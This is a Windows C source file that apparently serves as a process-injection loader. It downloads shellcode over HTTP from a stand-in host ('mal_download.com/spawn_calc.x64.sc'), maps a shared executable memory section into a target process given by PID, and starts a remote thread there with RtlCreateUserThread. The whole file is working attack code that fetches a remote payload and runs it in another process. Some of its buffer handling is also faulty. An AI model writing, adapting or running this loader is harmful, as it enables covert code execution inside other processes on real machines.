#include <windows.h>
#include <stdio.h>

SOCKET HTTPConnectToServer(char* server)
{
      SOCKADDR_IN serverInfo;
      SOCKET sck; 
      WSADATA wsaData; 
      LPHOSTENT hostEntry; 
      WSAStartup(MAKEWORD(2,2),&wsaData);
      hostEntry = gethostbyname(server);
      if(!hostEntry){  
           WSACleanup();  
           return 0; 
      } 
      sck = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
      if(sck==INVALID_SOCKET){
           WSACleanup(); 
           puts("Failed to setup socket");
           getchar(); 
           return 0; 
      } 
      serverInfo.sin_family = AF_INET;
      serverInfo.sin_addr   = *((LPIN_ADDR)*hostEntry->h_addr_list); 
      serverInfo.sin_port   = htons(80); 
      int i = connect(sck,(LPSOCKADDR)&serverInfo,sizeof(struct sockaddr));
     
      if(sck==SOCKET_ERROR) return 0;
      if(i!=0) return 0;
     
      return sck;
}

void HTTPRequestPage(SOCKET s,char *page,char *host)
{
    unsigned int len;
    if(strlen(page)>strlen(host)){
       len=strlen(page);
    }else len = strlen(host);
     
    char message[20+len];
    if(strlen(page)<=0){
       strcpy(message,"GET / HTTP/1.1\r\n");
    }else sprintf(message,"GET %s HTTP/1.1\r\n",page);
    send(s,message,strlen(message),0);
     
    memset(message,0,sizeof(message));
    sprintf(message,"Host: %s\r\n\r\n",host);
    send(s,message,strlen(message),0);
}

int GetContentSize( char* buffer, int len )
{
    char* ptr = strtok(buffer, "\n\r");
	int ret = -1;
	while ( ptr != NULL )
	{
		ptr = strtok(NULL,"\n\r");	
		if( strncmp( ptr, "Content-Length:", 15) == 0)
		{
			ptr = &ptr[16];
			ret = atoi( ptr );	
			break;
		}
	}
	return ret;
}
int getShellCode( char* webpage, char* buffer )
{
    int max = 0x2000;

    if(webpage==NULL||buffer==NULL||max==0) return FALSE;
     memset(buffer, 0, max);
     
    unsigned short shift=0;
    if(strncasecmp(webpage,"http://",strlen("http://"))==0){
        shift=strlen("http://");
    }
    if(strncasecmp(webpage+shift,"www.",strlen("www."))==0){
        shift+=strlen("www.");
    }
    char cut[strlen(webpage)-shift+1];
    strcpy(cut,strdup(webpage+shift));
     
    char *server = strtok(cut,"/");
     
    char *page = strdup(webpage+shift+strlen(server));
     
    SOCKET s = HTTPConnectToServer(server);
    HTTPRequestPage(s,page,server);
     
    int i = recv(s, buffer, max,0);
	printf("Max (%d) ret (%d)\n", max, i);
    int content_size = GetContentSize( buffer, i );
	if( content_size > 0 && content_size > max )
	{
		VirtualFree(buffer, max, NULL);
    	buffer = (char*)VirtualAlloc(NULL, content_size+10, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	}
    i = recv(s, buffer, content_size,0);
    closesocket(s);
     
    return content_size;
}

int main( int argc, char* argv[] )
{
	SIZE_T size = 4096;
	LARGE_INTEGER sectionSize = { size };
	HANDLE sectionHandle = NULL;
	PVOID localSectionAddress = NULL;
	PVOID remoteSectionAddress = NULL;
	DWORD targetPID = 0;
    int max = 0x2000;
	
	if( argc != 2 )
	{
		printf("USAGE: %s <target PID>\n", argv[0] );
		return -1;
	}

    char* buf = (char*)VirtualAlloc(NULL, max, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	int buf_sz = getShellCode("http://mal_download.com/spawn_calc.x64.sc", buf);
	targetPID = atoi( argv[1] );

	// create a memory section
	NtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	
	// create a view of the memory section in the local process
	NtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);
	printf("localSectionAddress (%p)\n", localSectionAddress);

	// create a view of the memory section in the target process
	HANDLE targetHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
	NtMapViewOfSection(sectionHandle, targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);
	printf("remoteSectionAddress (%p)\n", remoteSectionAddress);

	// copy shellcode to the local view, which will get reflected in the target process's mapped view
	memcpy(localSectionAddress, buf, size); 
	
	HANDLE targetThreadHandle = NULL;
	RtlCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL);

	VirtualFree( buf, NULL, NULL );
	return 0;
}
